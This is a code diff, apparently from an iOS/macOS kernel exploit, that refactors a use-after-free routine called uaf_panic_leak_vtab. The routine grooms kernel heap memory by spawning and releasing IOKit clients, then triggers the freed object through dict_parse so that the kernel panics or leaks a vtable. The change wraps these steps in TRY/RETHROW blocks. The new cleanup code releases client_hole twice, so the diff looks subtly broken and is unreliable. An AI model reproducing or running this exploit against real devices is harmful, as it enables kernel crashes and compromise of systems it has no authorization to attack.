@@ -1,14 +1,11 @@
-#include <errno.h>              // errno
-#include <stddef.h>             // size_t
 #include <stdint.h>             // uint32_t
-#include <stdlib.h>             // malloc, free
-#include <string.h>             // strerror
 #include <unistd.h>             // sleep, sync
 
 #include <IOKit/IOKitLib.h>     // IO*, io_*
 
-#include "common.h"             // DEBUG, ERROR
+#include "common.h"             // DEBUG
 #include "io.h"                 // kOS*, dict_parse, _io_*
+#include "try.h"                // THROW, TRY, RETHROW
 
 #include "uaf_panic.h"
 
@@ -143,23 +140,57 @@ void uaf_panic_leak_vtab()
     DEBUG("Allocating (hopefully) contiguous memory...");
     for(uint32_t i = 0; i < NUM_CLIENTS; ++i)
     {
-        client_hole[i] = _io_spawn_client(service, dict_hole, sizeof(dict_hole));
-        client_pad [i] = _io_spawn_client(service, dict_pad , sizeof(dict_pad ));
+        TRY
+        ({
+            client_hole[i] = _io_spawn_client(service, dict_hole, sizeof(dict_hole));
+            TRY
+            ({
+                client_pad[i] = _io_spawn_client(service, dict_pad , sizeof(dict_pad));
+            })
+            RETHROW
+            ({
+                _io_release_client(client_hole[i]);
+            })
+        })
+        RETHROW
+        ({
+            for(; i > 0; --i) // Can't use >= 0 because unsigned
+            {
+                _io_release_client(client_hole[i - 1]);
+                _io_release_client(client_hole[i - 1]);
+            }
+        })
     }
 
     DEBUG("Poking holes...");
+    // This is equivalent to cleanup, so no try blocks
     for(uint32_t i = 0; i < NUM_CLIENTS; ++i)
     {
         _io_release_client(client_hole[i]);
     }
 
     DEBUG("Fire in the hole! (This should panic.)");
-    sync();   // Write everything to disk
-    sleep(1); // Allow SSH to deliver latest output
-    dict_parse(dict, sizeof(dict));
-    DEBUG("...we're still here.");
+    // Write everything to disk
+    sync();
+    // Allow SSH to deliver latest output
+    sleep(1);
+
+    TRY
+    ({
+        dict_parse(dict, sizeof(dict));
+    })
+    RETHROW
+    ({
+        for(uint32_t i = 0; i < NUM_CLIENTS; ++i)
+        {
+            _io_release_client(client_pad[i]);
+        }
+        _io_release_client(client_plug);
+    })
+    DEBUG("...shit, we're still here.");
 
     DEBUG("Releasing remaining clients...");
+    // No try blocks around cleanup
     for(uint32_t i = 0; i < NUM_CLIENTS; ++i)
     {
         _io_release_client(client_pad[i]);
